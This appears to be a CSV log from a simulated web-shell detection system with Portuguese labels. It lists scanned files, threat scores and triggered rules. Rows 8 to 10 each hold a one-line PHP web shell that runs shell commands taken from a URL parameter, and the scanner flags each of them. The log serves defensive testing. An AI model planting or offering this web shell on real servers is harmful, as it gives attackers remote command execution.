id,agent_id,hostname,file_path,file_hash_sha256,file_content,threat_score,analysis_findings,is_whitelisted,quarantined_path,timestamp
1,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:26.909910+00:00
2,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:28.941768+00:00
3,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:30.953383+00:00
4,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:32.968894+00:00
5,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:34.983046+00:00
6,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/cache/page/index.html,,,0,,False,,2025-08-31 11:21:36.999955+00:00
7,benign-sim-agent-001,servidor-saudavel,/var/www/html/wp-content/uploads/2025/07/imagem_nova.jpg,,CONTEUDO_FALSO_DE_IMAGEM_JPG,0,{'regras_acionadas': None},False,,2025-08-31 11:21:39.010306+00:00
8,sim-agent-001,simulador-host,/tmp/simulacao_58793.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-31 11:27:46.883892+00:00
9,sim-agent-001,simulador-host,/tmp/simulacao_81066.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-31 11:27:50.985581+00:00
10,sim-agent-001,simulador-host,/tmp/simulacao_39597.php,,<?php echo shell_exec($_GET['cmd']); ?>,50,"{'regras_acionadas': ['Funções de execução de comando detectadas', 'Uso de variáveis superglobais ($_POST, $_GET etc.)']}",False,,2025-08-31 11:27:54.999327+00:00
